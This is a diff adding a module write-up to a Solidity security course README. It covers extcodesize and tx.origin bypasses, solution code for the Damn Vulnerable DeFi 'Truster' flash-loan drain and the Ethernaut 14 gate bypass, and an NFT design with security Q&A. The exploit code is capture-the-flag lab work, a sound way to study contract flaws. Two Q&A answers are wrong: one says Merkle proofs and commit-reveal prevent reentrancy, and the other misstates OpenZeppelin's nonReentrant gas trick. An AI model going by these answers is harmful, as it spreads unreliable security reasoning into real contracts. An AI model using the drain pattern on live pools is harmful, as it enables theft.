@@ -207,3 +207,124 @@ deliverables for this module are:
   of Solidity. This repository doesn't depend on testnets and uses the latest Solidity version. Some problems could not
   be ported because they rely on vulnerabilities that only existed in older versions of Solidity. Some liberty has been
   taken where the syntax and other compiler features are no longer compatible. The foundry environment is available at [
+
+### Module 8: Address Security and Advanced NFT
+
+This module covers two main topics: address-related security considerations and implementation of an advanced NFT
+contract.
+
+#### Part 1: Address Hacks
+
+1. **ExtcodeSize Bypass**
+
+- Demonstrated how `extcodesize` check can be bypassed in constructors
+- Note: OpenZeppelin removed `isContract` in v5 due to security vulnerabilities
+- Manual `extcodesize` checks implemented to demonstrate vulnerability
+
+2. **Transaction Origin vs Sender**
+
+- Implemented demonstration of `msg.sender == tx.origin` security check
+- Showed how this blocks constructor calls
+- Used OpenZeppelin's Address library functionality
+
+3. **Damn Vulnerable DeFi Challenge #3**
+
+- Completed Truster challenge
+
+```solidity
+function test_truster() public checkSolvedByPlayer {
+    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
+    pool.flashLoan(
+        0,  // amount
+        player,  // borrower
+        address(token),  // target
+        data  // approval call
+    );
+    token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+    vm.setNonce(player, 1);
+}
+```
+
+4. **Ethernaut 14**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.26;
+
+import "@openzeppelin/contracts/utils/Address.sol";
+
+
+contract Gate2 {
+    using Address for address;
+
+    constructor(address _gk2) {
+        require(_gk2 != address(0));
+
+        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+
+        require(abi.decode(_gk2.functionCall(abi.encodeWithSignature("enter(bytes8)", key)), (bool)));
+    }
+}
+```
+
+#### Part 2: Advanced NFT Implementation
+
+1. **Merkle Tree Airdrop**
+
+- Implemented presale minting with merkle tree verification
+- Gas cost comparison between mapping and bitmap:
+    - Mapping: Higher storage costs
+    - Bitmap: More efficient for large sets
+- Used OpenZeppelin's BitMaps library
+
+2. **Commit-Reveal Mechanism**
+
+- Two-phase minting process for random NFT IDs
+- 10 block waiting period between commit and reveal
+- Random ID generation using blockhash
+- Front-running prevention through commit-reveal pattern
+
+3. **Multicall Implementation**
+
+- Inherited from OpenZeppelin's Multicall
+- Enables batch transfers in single transaction
+- Protected against minting abuse through proper overrides
+- Uses ERC721Enumerable for token tracking
+
+4. **State Machine**
+
+- States: NOT_STARTED → PRESALE → PUBLIC_SALE → SOLD_OUT
+- State transitions:
+    - NOT_STARTED to PRESALE: 1 hour after deployment
+    - PRESALE to PUBLIC_SALE: After 1 day
+    - Any state to SOLD_OUT: When max supply reached
+
+5. **Payment Distribution**
+
+- Implemented using OpenZeppelin's PaymentSplitter
+- Supports arbitrary number of contributors
+- Pull pattern for secure withdrawals
+- Set up at deployment with predefined shares
+
+#### Security Considerations
+
+**Q: Should you be using pausable or nonReentrant in your NFT? Why or not?**
+
+A: No, because:
+
+1. Merkle tree verification requires valid proofs
+2. Commit-reveal pattern requires valid secrets
+3. These mechanisms inherently prevent reentrancy
+4. State machine ensures proper flow control
+
+**Q: What trick does OpenZeppelin use to save gas on the nonReentrant modifier?**
+
+A: OpenZeppelin uses compile-time constants for status flags:
+
+```solidity
+uint256 private constant NOT_ENTERED = 1;
+uint256 private constant ENTERED = 2;
+```
+
+Since they are constants, they become part of the bytecode. This implies no storage slot is used, saving the expensive
+gas costs associated with SSTORE operations. Moreover, reading is very cheap, as it is just a bytecode lookup.
